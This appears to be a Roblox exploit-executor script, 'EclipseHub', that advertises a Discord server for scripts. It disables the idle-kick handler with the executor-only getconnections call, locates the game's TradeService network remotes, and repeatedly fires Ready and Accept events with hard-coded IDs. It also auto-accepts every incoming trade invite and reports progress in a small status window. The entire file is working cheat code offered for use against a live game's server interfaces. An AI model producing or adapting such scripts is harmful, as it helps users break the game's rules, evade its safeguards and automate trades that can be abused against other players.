repeat task.wait() until game:IsLoaded()
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
for i, v in pairs(getconnections(LocalPlayer.Idled)) do
    if v.Disable then v:Disable() end
end
LocalPlayer.Idled:Connect(function() end)
local gui = Instance.new("ScreenGui")
gui.Name = "EclipseHub"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 220, 0, 80)
frame.Position = UDim2.new(0, 16, 0, 16)
frame.BackgroundColor3 = Color3.fromRGB(12, 10, 18)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.ClipsDescendants = true
frame.Parent = gui
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = frame
local outerStroke = Instance.new("UIStroke")
outerStroke.Thickness = 1
outerStroke.Color = Color3.fromRGB(160, 40, 255)
outerStroke.Transparency = 0.3
outerStroke.Parent = frame
local accentBar = Instance.new("Frame")
accentBar.Size = UDim2.new(0, 3, 1, -16)
accentBar.Position = UDim2.new(0, 8, 0, 8)
accentBar.BackgroundColor3 = Color3.fromRGB(180, 50, 255)
accentBar.BorderSizePixel = 0
accentBar.Parent = frame
local accentCorner = Instance.new("UICorner")
accentCorner.CornerRadius = UDim.new(1, 0)
accentCorner.Parent = accentBar

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -24, 0, 22)
title.Position = UDim2.new(0, 20, 0, 10)
title.BackgroundTransparency = 1
title.Text = "limitedmade thsi"
title.TextColor3 = Color3.fromRGB(230, 200, 255)
title.TextSize = 13
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame


local discord = Instance.new("TextLabel")
discord.Size = UDim2.new(1, -24, 0, 14)
discord.Position = UDim2.new(0, 20, 0, 30)
discord.BackgroundTransparency = 1
discord.Text = "discord.gg/sabscripts"
discord.TextColor3 = Color3.fromRGB(120, 80, 180)
discord.TextSize = 10
discord.Font = Enum.Font.Gotham
discord.TextXAlignment = Enum.TextXAlignment.Left
discord.Parent = frame

local divider = Instance.new("Frame")
divider.Size = UDim2.new(1, -32, 0, 1)
divider.Position = UDim2.new(0, 16, 0, 50)
divider.BackgroundColor3 = Color3.fromRGB(60, 30, 90)
divider.BorderSizePixel = 0
divider.Parent = frame


local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, 7, 0, 7)
dot.Position = UDim2.new(0, 20, 0, 61)
dot.BackgroundColor3 = Color3.fromRGB(160, 40, 255)
dot.BorderSizePixel = 0
dot.Parent = frame

local dotCorner = Instance.new("UICorner")
dotCorner.CornerRadius = UDim.new(1, 0)
dotCorner.Parent = dot


local label = Instance.new("TextLabel")
label.Size = UDim2.new(1, -40, 0, 16)
label.Position = UDim2.new(0, 32, 0, 57)
label.BackgroundTransparency = 1
label.Text = "listening..."
label.TextColor3 = Color3.fromRGB(200, 170, 255)
label.TextSize = 11
label.Font = Enum.Font.GothamSemibold
label.TextXAlignment = Enum.TextXAlignment.Left
label.Parent = frame

local function pulseDot(color)
    dot.BackgroundColor3 = color or Color3.fromRGB(160, 40, 255)
    local t1 = TweenService:Create(dot, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        BackgroundTransparency = 0.6
    })
    t1:Play()
end
pulseDot()

frame.Position = UDim2.new(0, -240, 0, 16)
TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.new(0, 16, 0, 16)
}):Play()


local function setStatus(text, color)
    label.Text = text
    label.TextColor3 = color or Color3.fromRGB(200, 170, 255)
    pulseDot(color)
end


local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")

local function getRemote(name)
    local children = Net:GetChildren()
    for i, obj in ipairs(children) do
        if obj.Name == name then
            return children[i+1]
        end
    end
    return nil
end

local acceptInviteRF = getRemote("RF/TradeService/AcceptInvite")
local createInviteRE = getRemote("RE/TradeService/CreateInvite")
local readyRE        = getRemote("RE/TradeService/Ready")
local acceptRE       = getRemote("RE/TradeService/Accept")

task.spawn(function()
    while true do
        if readyRE then
            pcall(function() readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end)
        end
        task.wait(1)
        if acceptRE then
            pcall(function() acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end)
        end
        task.wait(1)
    end
end)

if createInviteRE then
    createInviteRE.OnClientEvent:Connect(function(tradeId, tradeData)
        print("[createInviteRE] tradeId:", tradeId, "tradeData:", tradeData)
        if tradeId then
            task.spawn(function()
                setStatus("accepting...", Color3.fromRGB(255, 200, 80))
                local success, result = pcall(function()
                    return acceptInviteRF:InvokeServer("57624f2b-8aa9-4974-bb7a-08f058af33ef", tradeId)
                end)
                print("[acceptInvite] success:", success, "result:", result)
                if success and result then
                    setStatus("in trade ✓", Color3.fromRGB(80, 255, 160))
                else
                    setStatus("error", Color3.fromRGB(255, 80, 80))
                    task.wait(2)
                    setStatus("listening...", Color3.fromRGB(200, 170, 255))
                end
            end)
        end
    end)
else
    setStatus("remotes not found", Color3.fromRGB(255, 80, 80))
end